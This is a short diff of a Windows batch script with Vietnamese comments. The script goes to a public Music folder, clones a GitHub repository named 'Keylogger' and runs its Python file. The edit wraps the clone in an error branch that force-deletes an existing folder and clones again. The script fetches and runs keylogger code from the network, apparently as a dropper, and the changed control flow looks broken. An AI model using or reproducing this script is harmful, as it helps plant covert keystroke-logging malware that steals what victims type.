@@ -67,8 +67,16 @@ exit
 :cloneProject
 cd C:\Users\Public\Music
 rem Clone từ link GitHub
-git clone https://github.com/LeDuonng/Keylogger.git
-if %errorLevel% neq 0 goto error
+
+if %errorLevel% neq 0 (
+    if exist Keylogger (
+        rmdir /s /q Keylogger
+        git clone https://github.com/LeDuonng/Keylogger.git
+    ) else (
+        git clone https://github.com/LeDuonng/Keylogger.git
+    )
+    goto error
+)
 rem Chạy dự án bằng Python
 cd Keylogger
 python a.py
